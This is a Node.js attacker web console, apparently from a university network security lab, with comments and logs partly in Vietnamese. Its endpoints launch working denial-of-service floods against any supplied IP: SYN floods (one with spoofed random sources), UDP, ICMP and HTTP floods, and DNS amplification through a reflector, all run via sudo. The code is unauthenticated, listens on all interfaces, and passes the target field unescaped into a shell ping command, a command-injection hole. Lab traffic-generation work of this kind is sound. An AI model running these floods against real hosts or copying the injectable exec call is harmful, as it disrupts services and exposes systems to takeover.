#!/usr/bin/env node
/**
 * Standalone Traffic Generator Console (Attacker Web Controller)
 * DUT PBL3 · Network Security Lab
 */
const http = require("http");
const path = require("path");
const fs = require("fs");
const { spawn, exec } = require("child_process");

// Resolve express & ws from local or ../dashboard/node_modules
function loadDep(name) {
  try {
    return require(name);
  } catch (e) {
    const fallbackPath = path.join(__dirname, "..", "dashboard", "node_modules", name);
    if (fs.existsSync(fallbackPath)) {
      return require(fallbackPath);
    }
    throw new Error(`Cannot find module '${name}'. Run npm install in dashboard/ or attacker_dashboard/.`);
  }
}

const express = loadDep("express");
const { WebSocketServer } = loadDep("ws");

// Parse CLI flags
const args = process.argv.slice(2);
function getArg(flag, fallback) {
  const idx = args.indexOf(flag);
  if (idx >= 0 && idx + 1 < args.length) return args[idx + 1];
  return fallback;
}

const PORT = parseInt(getArg("--port", process.env.PORT || "4000"), 10);
const HOST = getArg("--host", process.env.HOST || "0.0.0.0");
const ROOT_DIR = path.join(__dirname, "..");
const ATTACKS_DIR = path.join(ROOT_DIR, "attacks");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

let activeScenario = null; // { name, desc, target, port, pid, startTime, pps }
let currentProcess = null;
let eventLogs = [];
let wss = null;

function addLog(level, msg) {
  const item = {
    id: Date.now() + "_" + Math.random().toString(36).substr(2, 4),
    time: new Date().toLocaleTimeString(),
    level, // 'info', 'warn', 'err', 'success'
    msg,
  };
  eventLogs.push(item);
  if (eventLogs.length > 200) eventLogs.shift();
  broadcast({ type: "log", data: item });
}

function broadcast(obj) {
  if (!wss || !wss.clients) return;
  const raw = JSON.stringify(obj);
  wss.clients.forEach((c) => {
    if (c.readyState === 1) c.send(raw);
  });
}

function broadcastStatus() {
  broadcast({
    type: "status",
    data: {
      active: !!activeScenario,
      scenario: activeScenario,
    },
  });
}

// Kill running attack process & background tools
function stopCurrentAttack() {
  return new Promise((resolve) => {
    if (currentProcess) {
      try {
        currentProcess.kill("SIGINT");
        setTimeout(() => {
          try { currentProcess.kill("SIGKILL"); } catch (e) {}
        }, 500);
      } catch (e) {}
      currentProcess = null;
    }

    // Force cleanup any remaining tools on machine
    exec("sudo pkill -f hping3; sudo pkill -f http_flood.py; sudo pkill -f dns_amp.py", () => {
      if (activeScenario) {
        addLog("warn", `[DỪNG] Đã ngắt kịch bản ${activeScenario.name} (${activeScenario.desc}). Hệ thống về IDLE.`);
      }
      activeScenario = null;
      broadcastStatus();
      resolve();
    });
  });
}

// 1. Pre-flight Target Check (Ping + HTTP Probe)
app.post("/api/check", (req, res) => {
  const target = (req.body.target || "").trim();
  const port = parseInt(req.body.port || "80", 10);

  if (!target) {
    return res.status(400).json({ ok: false, error: "Vui lòng nhập IP mục tiêu" });
  }

  // Bước 1: Ping thử nghiệm L2/L3 mạng nội bộ
  const pingCmd = `ping -c 1 -W 1 ${target}`;
  exec(pingCmd, (pingErr, pingStdout) => {
    let pingOk = !pingErr;
    let pingMs = null;
    if (pingOk) {
      const match = pingStdout.match(/time=([0-9.]+)\s*ms/);
      if (match) pingMs = parseFloat(match[1]);
    }

    // Bước 2: Thử HTTP GET tới máy chủ Web Victim
    const t0 = Date.now();
    const probeReq = http.get(
      {
        host: target,
        port: port,
        path: "/",
        timeout: 2000,
      },
      (probeRes) => {
        const httpMs = Date.now() - t0;
        probeRes.resume();
        const httpOk = probeRes.statusCode >= 200 && probeRes.statusCode < 500;
        addLog(
          httpOk ? "success" : "warn",
          `[Check Target] ${target}:${port} ── Ping: ${pingOk ? pingMs + "ms" : "ERR"} | HTTP ${probeRes.statusCode} (${httpMs}ms)`
        );
        res.json({
          ok: true,
          target,
          port,
          ping: { ok: pingOk, ms: pingMs },
          http: { ok: httpOk, code: probeRes.statusCode, ms: httpMs },
        });
      }
    );

    probeReq.on("error", (err) => {
      const httpMs = Date.now() - t0;
      addLog(
        "warn",
        `[Check Target] ${target}:${port} ── Ping: ${pingOk ? pingMs + "ms" : "ERR"} | HTTP Lỗi: ${err.message}`
      );
      res.json({
        ok: true,
        target,
        port,
        ping: { ok: pingOk, ms: pingMs },
        http: { ok: false, code: null, ms: httpMs, error: err.message },
      });
    });

    probeReq.on("timeout", () => {
      probeReq.destroy();
      res.json({
        ok: true,
        target,
        port,
        ping: { ok: pingOk, ms: pingMs },
        http: { ok: false, code: null, ms: 2000, error: "HTTP Timeout (2s)" },
      });
    });
  });
});

// 2. Start Test Scenario
app.post("/api/attack/start", async (req, res) => {
  const { scenario, target, port = 80, reflector = "172.30.0.30", pps = 200 } = req.body;
  if (!target) {
    return res.status(400).json({ ok: false, error: "Thiếu IP mục tiêu (target)" });
  }

  await stopCurrentAttack();

  let cmd = [];
  let name = scenario || "A";
  let desc = "";

  const us = Math.max(10, Math.floor(1000000 / (pps || 200)));

  switch (scenario) {
    case "A": // L4 TCP SYN Direct (1 nguồn thật)
      desc = "L4 TCP SYN Flood (Direct 1 nguồn thật)";
      cmd = ["sudo", "hping3", "-S", "-p", String(port), "-i", `u${us}`, "-q", target];
      break;

    case "B": // L4 TCP SYN Spoofed (Botnet nhiều nguồn ngẫu nhiên)
      desc = "L4 TCP SYN Flood (IP Spoofing / Botnet ngẫu nhiên)";
      cmd = ["sudo", "hping3", "-S", "-p", String(port), "--rand-source", "-i", `u${us}`, "-q", target];
      break;

    case "C": // L7 HTTP Flood Paced
      desc = "L7 HTTP Flood (Paced - có điều tiết nhịp)";
      const httpScript = path.join(ATTACKS_DIR, "http_flood.py");
      cmd = ["python3", httpScript, target, "-p", String(port), "-t", "20", "--pps", String(pps), "-d", "999999"];
      break;

    case "U": // L4 UDP Volumetric
      desc = "L4 UDP Volumetric Flood";
      cmd = ["sudo", "hping3", "--udp", "-p", String(port), "-i", `u${us}`, "-q", target];
      break;

    case "I": // L3 ICMP Echo Ping Flood
      desc = "L3 ICMP Ping Flood";
      cmd = ["sudo", "hping3", "--icmp", "-i", `u${us}`, "-q", target];
      break;

    case "DNS": // DNS Amplification (Reflection)
      desc = "DNS Amplification (Reflection qua Reflector)";
      const dnsScript = path.join(ATTACKS_DIR, "dns_amp.py");
      const refIp = reflector || "172.30.0.30";
      cmd = ["sudo", "python3", dnsScript, refIp, "--victim", target, "--pps", String(pps)];
      break;

    default:
      return res.status(400).json({ ok: false, error: `Kịch bản không hợp lệ: ${scenario}` });
  }

  addLog("info", `[KÍCH HOẠT] Khởi chạy ${name} — ${desc} ➔ Target: ${target}:${port} (pps=${pps})`);

  try {
    currentProcess = spawn(cmd[0], cmd.slice(1), {
      detached: false,
      stdio: ["ignore", "pipe", "pipe"],
    });

    activeScenario = {
      name,
      desc,
      target,
      port,
      reflector,
      pps,
      cmdStr: cmd.join(" "),
      startTime: Date.now(),
      pid: currentProcess.pid,
    };

    currentProcess.stdout.on("data", (data) => {
      const line = data.toString().trim();
      if (line) addLog("info", `[${name}] ${line}`);
    });

    currentProcess.stderr.on("data", (data) => {
      const line = data.toString().trim();
      if (line) addLog("warn", `[${name}] ${line}`);
    });

    currentProcess.on("exit", (code) => {
      addLog("info", `[${name}] Tiến trình kết thúc (exit code: ${code}).`);
      activeScenario = null;
      currentProcess = null;
      broadcastStatus();
    });

    broadcastStatus();
    res.json({ ok: true, active: true, scenario: activeScenario });
  } catch (err) {
    addLog("err", `[LỖI] Không thể spawn lệnh: ${err.message}`);
    res.status(500).json({ ok: false, error: err.message });
  }
});

// 3. Stop Attack
app.post("/api/attack/stop", async (req, res) => {
  await stopCurrentAttack();
  res.json({ ok: true, active: false });
});

// 4. Status API
app.get("/api/status", (req, res) => {
  res.json({
    active: !!activeScenario,
    scenario: activeScenario,
    logs: eventLogs.slice(-50),
  });
});

const server = http.createServer(app);
wss = new WebSocketServer({ server });

wss.on("connection", (ws) => {
  ws.send(
    JSON.stringify({
      type: "init",
      data: {
        active: !!activeScenario,
        scenario: activeScenario,
        logs: eventLogs.slice(-50),
      },
    })
  );
});

server.listen(PORT, HOST, () => {
  console.log(`=======================================================`);
  console.log(`  🧪 Traffic Generator Console (DUT PBL3 Attacker Controller)`);
  console.log(`  📡 Web Console: http://${HOST === "0.0.0.0" ? "localhost" : HOST}:${PORT}`);
  console.log(`  🛑 Emergency stop: Ctrl+C or Click 'STOP' in Browser`);
  console.log(`=======================================================`);
  addLog("info", `Bảng điều khiển đã khởi động tại cổng ${PORT}. Sẵn sàng phát tải.`);
});
